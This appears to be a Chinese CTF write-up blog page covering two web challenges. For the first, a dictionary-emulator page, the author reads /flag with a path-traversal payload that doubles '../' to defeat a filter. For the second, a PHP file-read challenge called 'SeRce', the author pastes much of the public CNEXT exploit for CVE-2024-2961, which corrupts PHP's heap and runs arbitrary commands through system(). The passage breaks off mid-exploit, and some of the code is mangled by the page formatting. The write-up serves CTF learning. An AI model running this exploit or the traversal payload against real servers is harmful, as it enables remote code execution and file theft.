亮度：50% | 音量：0%&quot;</span>);</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;(这台文曲星实在太老啦，按键边缘都磨出了包浆，连基础设置功能都早已歇业，再也调不了背光亮度啦～)&quot;</span>);</span><br><span class="line">            isMenuActive = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">`&gt; <span class="subst">$&#123;key&#125;</span>`</span>);</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[错误] 请按A/B/C选择&quot;</span>, <span class="string">&quot;text-red-400&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回键功能（菜单状态下按返回键关闭菜单）</span></span><br><span class="line">backKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>), <span class="number">100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 菜单状态下优先关闭菜单</span></span><br><span class="line">    <span class="keyword">if</span> (isMenuActive) &#123;</span><br><span class="line">        isMenuActive = <span class="literal">false</span>;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[返回] 菜单已关闭&quot;</span>);</span><br><span class="line">        inputBox.<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 普通状态下删除最后一个字符</span></span><br><span class="line">    <span class="keyword">if</span> (inputBox.<span class="property">value</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        inputBox.<span class="property">value</span> = inputBox.<span class="property">value</span>.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[返回上级]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查词/执行指令功能（保留原有逻辑）</span></span><br><span class="line">searchKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>), <span class="number">100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> input = inputBox.<span class="property">value</span>.<span class="title function_">trim</span>();</span><br><span class="line">    <span class="keyword">if</span> (!input) &#123;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;请输入内容&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">addScreenMessage</span>(<span class="string">`&gt; <span class="subst">$&#123;input&#125;</span>`</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 发送请求到后端</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;handler.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">`action=<span class="subst">$&#123;debugMode ? <span class="string">&#x27;command&#x27;</span> : <span class="string">&#x27;lookup&#x27;</span>&#125;</span>&amp;content=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(input)&#125;</span>`</span></span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="title function_">includes</span>(<span class="string">&#x27;ERROR:&#x27;</span>)) &#123;</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(data.<span class="title function_">replace</span>(<span class="string">&#x27;ERROR:&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;text-red-400&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> displayData = data.<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            <span class="title function_">addScreenMessage</span>(displayData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">`请求失败: <span class="subst">$&#123;error.message&#125;</span>`</span>, <span class="string">&#x27;text-red-400&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空功能（清空时关闭菜单）</span></span><br><span class="line">clearKey.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;key-press&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;key-press&#x27;</span>), <span class="number">100</span>);</span><br><span class="line">    inputBox.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 菜单状态下清空时同步关闭菜单</span></span><br><span class="line">    <span class="keyword">if</span> (isMenuActive) &#123;</span><br><span class="line">        isMenuActive = <span class="literal">false</span>;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;[菜单已关闭] 输入已清空&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">addScreenMessage</span>(<span class="string">&quot;已清空输入&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 屏幕消息添加函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addScreenMessage</span>(<span class="params">message, className = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">    p.<span class="property">innerHTML</span> = message;</span><br><span class="line">    <span class="keyword">if</span> (className) &#123;</span><br><span class="line">        p.<span class="property">className</span> = className;</span><br><span class="line">    &#125;</span><br><span class="line">    screenContent.<span class="title function_">appendChild</span>(p);</span><br><span class="line">    <span class="comment">// 自动滚动到底部</span></span><br><span class="line">    screenContent.<span class="property">scrollTop</span> = screenContent.<span class="property">scrollHeight</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 键盘输入处理（支持键盘A/B/C选择菜单）</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="comment">// 阻止默认行为，避免重复输入</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^[a-z#]$/i</span>.<span class="title function_">test</span>(e.<span class="property">key</span>) || e.<span class="property">key</span> === <span class="string">&#x27;Backspace&#x27;</span> || e.<span class="property">key</span> === <span class="string">&#x27;Enter&#x27;</span>) &#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> key = e.<span class="property">key</span>.<span class="title function_">toUpperCase</span>(); <span class="comment">// 统一转为大写处理（兼容大小写输入）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 菜单状态下，优先处理A/B/C键（键盘输入）</span></span><br><span class="line">    <span class="keyword">if</span> (isMenuActive &amp;&amp; [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>].<span class="title function_">includes</span>(key)) &#123;</span><br><span class="line">        <span class="title function_">handleMenuSelection</span>(key);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 普通输入状态处理</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^[A-Z]$/</span>.<span class="title function_">test</span>(key)) &#123;</span><br><span class="line">        <span class="keyword">let</span> inputChar = isUpperCase ? key : key.<span class="title function_">toLowerCase</span>();</span><br><span class="line">        inputBox.<span class="property">value</span> += inputChar;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key === <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        inputBox.<span class="property">value</span> += <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&#x27;Enter&#x27;</span>) &#123;</span><br><span class="line">        searchKey.<span class="title function_">click</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&#x27;Backspace&#x27;</span>) &#123;</span><br><span class="line">        backKey.<span class="title function_">click</span>(); <span class="comment">// 复用返回键逻辑（含菜单关闭）</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&#x27;Escape&#x27;</span>) &#123;</span><br><span class="line">        clearKey.<span class="title function_">click</span>(); <span class="comment">// 复用清空键逻辑（含菜单关闭）</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&#x27;CapsLock&#x27;</span>) &#123;</span><br><span class="line">        capsKey.<span class="title function_">click</span>(); <span class="comment">// 同步系统大小写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);    </span><br></pre></td></tr></table></figure>

<p>发现存在调试模式,长按Fn即可进入</p>
<p>发现可以输入<code>#HELP</code></p>
<p><img src="/images/image-20250914102036401.png" alt="image-20250914102036401"></p>
<p><img src="/images/image-20250914102125166.png" alt="image-20250914102125166"></p>
<p><img src="/images/image-20250914102237341.png" alt="image-20250914102237341"></p>
<p>得到提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提示：</span><br><span class="line">flag在/flag下，可以尝试目录穿越漏洞来读取它。</span><br><span class="line">会过滤“../”，可以使用双写来绕过。</span><br><span class="line">文件名有大小写区分。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#read ....//....//....//....//flag</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250914103038978.png" alt="image-20250914103038978"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;61c8ac25-502a-4465-8295-6466f5917180&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$exp</span> = <span class="variable">$_GET</span>[<span class="string">&quot;exp&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$exp</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$exp</span>)) != <span class="variable">$exp</span>)&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filetoread&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File Contents: <span class="subst">$data</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之前有见到过这题,CVE-2024-2961</p>
<p>可参考这篇文章:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14986,https://github.com/kezibei/php-filter-iconv">https://xz.aliyun.com/news/14986,https://github.com/kezibei/php-filter-iconv</a></p>
<p>存在以下利用脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure>

<pre><code>Tweak it to fit your target, and start the exploit.
&quot;&quot;&quot;

def __init__(self, url: str) -&gt; None:
    self.url = url
    self.session = Session()

def send(self, path: str) -&gt; Response:
    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
    &quot;&quot;&quot;
    return self.session.post(self.url, data=&#123;&quot;file&quot;: path&#125;)
    
def download(self, path: str) -&gt; bytes:
    &quot;&quot;&quot;Returns the contents of a remote file.
    &quot;&quot;&quot;
    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
    response = self.send(path)
    data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)
    return base64.decode(data)
</code></pre>
<p>@entry<br>@arg(“url”, “Target URL”)<br>@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>@arg(“sleep”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>@arg(<br>    “pad”,<br>    “Number of 0x100 chunks to pad with. If the website makes a lot of heap “<br>    “operations with this size, increase this. Defaults to 20.”,<br>)<br>@dataclass<br>class Exploit:<br>    “””CNEXT exploit: RCE using a file read primitive in PHP.”””</p>
<pre><code>url: str
command: str
sleep: int = 1
heap: str = None
pad: int = 20

def __post_init__(self):
    self.remote = Remote(self.url)
    self.log = logger(&quot;EXPLOIT&quot;)
    self.info = &#123;&#125;
    self.heap = self.heap and int(self.heap, 16)

def check_vulnerable(self) -&gt; None:
    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
    wrappers and filters that the exploit needs.
    &quot;&quot;&quot;
    
    def safe_download(path: str) -&gt; bytes:
        try:
            return self.remote.download(path)
        except ConnectionError:
            failure(&quot;Target not [b]reachable[/] ?&quot;)


    def check_token(text: str, path: str) -&gt; bool:
        result = safe_download(path)
        return text.encode() == result

    text = tf.random.string(50).encode()
    base64 = b64(text, misalign=True).decode()
    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;
    
    result = safe_download(path)
    
    if text not in result:
        msg_failure(&quot;Remote.download did not return the test string&quot;)
        print(&quot;--------------------&quot;)
        print(f&quot;Expected test string: &#123;text&#125;&quot;)
        print(f&quot;Got: &#123;result&#125;&quot;)
        print(&quot;--------------------&quot;)
        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]data://[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(text.encode(), misalign=True).decode()
    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
    if not check_token(text, path):
        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(compress(text.encode()), misalign=True).decode()
    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;

    if not check_token(text, path):
        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)

    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)

    msg_success(&quot;Exploit preconditions are satisfied&quot;)

def get_file(self, path: str) -&gt; bytes:
    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
        return self.remote.download(path)

def get_regions(self) -&gt; list[Region]:
    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
    maps = self.get_file(&quot;/proc/self/maps&quot;)
    maps = maps.decode()
    PATTERN = re.compile(
        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
    )
    regions = []
    for region in table.split(maps, strip=True):
        if match := PATTERN.match(region):
            start = int(match.group(1), 16)
            stop = int(match.group(2), 16)
            permissions = match.group(3)
            path = match.group(4)
            if &quot;/&quot; in path or &quot;[&quot; in path:
                path = path.rsplit(&quot; &quot;, 1)[-1]
            else:
                path = &quot;&quot;
            current = Region(start, stop, permissions, path)
            regions.append(current)
        else:
            print(maps)
            failure(&quot;Unable to parse memory mappings&quot;)

    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)

    return regions

def get_symbols_and_addresses(self) -&gt; None:
    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
    regions = self.get_regions()

    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;

    # PHP&#39;s heap

    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)

    # Libc

    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)

    self.download_file(libc.path, LIBC_FILE)

    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
    self.info[&quot;libc&quot;].address = libc.start

def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
    for region in regions:
        if any(name in region.path for name in names):
            break
    else:
        failure(&quot;Unable to locate region&quot;)

    return region

def download_file(self, remote_path: str, local_path: str) -&gt; None:
    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
    data = self.get_file(remote_path)
    Path(local_path).write(data)

def find_main_heap(self, regions: list[Region]) -&gt; Region:
    # Any anonymous RW region with a size superior to the base heap size is a
    # candidate. The heap is at the bottom of the region.
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == &quot;rw-p&quot;
        and region.size &gt;= HEAP_SIZE
        and region.stop &amp; (HEAP_SIZE-1) == 0
        and region.path in (&quot;&quot;, &quot;[anon:zend_alloc]&quot;)
    ]

    if not heaps:
        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)

    first = heaps[0]

    if len(heaps) &gt; 1:
        heaps = &quot;, &quot;.join(map(hex, heaps))
        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
    else:
        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)

    return first

def run(self) -&gt; None:
    self.check_vulnerable()
    self.get_symbols_and_addresses()
    self.exploit()

def build_exploit_path(self) -&gt; str:
    &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the
    other. Processing generally involves making some kind of operation either
    on the chunk or in a destination chunk of the same size. Each operation is
    applied on every single chunk; you cannot make PHP apply iconv on the first 10
    chunks and leave the rest in place. That&#39;s where the difficulties come from.

    Keep in mind that we know the address of the main heap, and the libraries.
    ASLR/PIE do not matter here.

    The idea is to use the bug to make the freelist for chunks of size 0x100 point
    lower. For instance, we have the following free list:

    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00

    By triggering the bug from chunk ..900, we get:

    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???

    That&#39;s step 3.

    Now, in order to control the free list, and make it point whereever we want,
    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
    That&#39;s step 2.

    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have
    a problem: after step2 has been processed, the free list goes bottom-up, like:

    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900

    We need to go the other way around. That&#39;s why we have step 1: it just allocates
    chunks. When they get freed, they reverse the free list. Now step2 allocates in
    reverse order, and therefore after step2, chunks are in the correct order.

    Another problem comes up.

    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
    Since step2 creates chunks that contain pointers and pointers are generally not
    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
    To avoid this, we put the chunks in step2 at the very end of the chain, and
    prefix them with `0\n`. When dechunked (right before the iconv), they will
    &quot;disappear&quot; from the chain, preserving them from the character set conversion
    and saving us from an unwanted processing error that would stop the processing
    chain.

    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
    don&#39;t know the precise layout of the heap, but we know that at the top of the
    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
    Its free_slot[] array contains a pointer to each free list. By overwriting it,
    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
    field contains pointers to hook functions for emalloc, efree, and erealloc
    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
    then overwrite the use_custom_heap flag to make PHP use these function pointers
    instead. We can now do our favorite CTF technique and get a call to
    system(&lt;chunk&gt;).
    We make sure that the &quot;system&quot; command kills the current process to avoid other
    system() calls with random chunk data, leading to undefined behaviour.

    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
    process is in a random state, we still get contiguous, in order chunks for our
    exploit.

    Therefore, the whole process described here CANNOT crash. Everything falls
    perfectly in place, and nothing can get in the middle of our allocations.
    &quot;&quot;&quot;

    LIBC = self.info[&quot;libc&quot;]
    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]

    ADDR_HEAP = self.info[&quot;heap&quot;]
    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

    CS = 0x100

    # Pad needs to stay at size 0x100 at every step
    pad_size = CS - 0x18
    pad = b&quot;\x00&quot; * pad_size
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = compressed_bucket(pad)

    step1_size = 1
    step1 = b&quot;\x00&quot; * step1_size
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, CS)
    step1 = compressed_bucket(step1)

    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;

    step2_size = 0x48
    step2 = b&quot;\x00&quot; * (step2_size + 8)
    step2 = chunked_chunk(step2, CS)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3_size = CS

    step3 = b&quot;\x00&quot; * step3_size
    assert len(step3) == CS
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
    assert len(step3_overflow) == CS
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4_size = CS
    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    # This chunk will eventually overwrite mm_heap-&gt;free_slot
    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
    step4_pwn = ptr_bucket(
        0x200000,
        0,
        # free_slot
        0,
        0,
        ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=CS,
    )

    step4_custom_heap = ptr_bucket(
        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
    )

    step4_use_custom_heap_size = 0x140

    COMMAND = self.command
    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
    if self.sleep:
        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
    COMMAND = COMMAND.encode() + b&quot;\x00&quot;

    assert (
        len(COMMAND) &lt;= step4_use_custom_heap_size
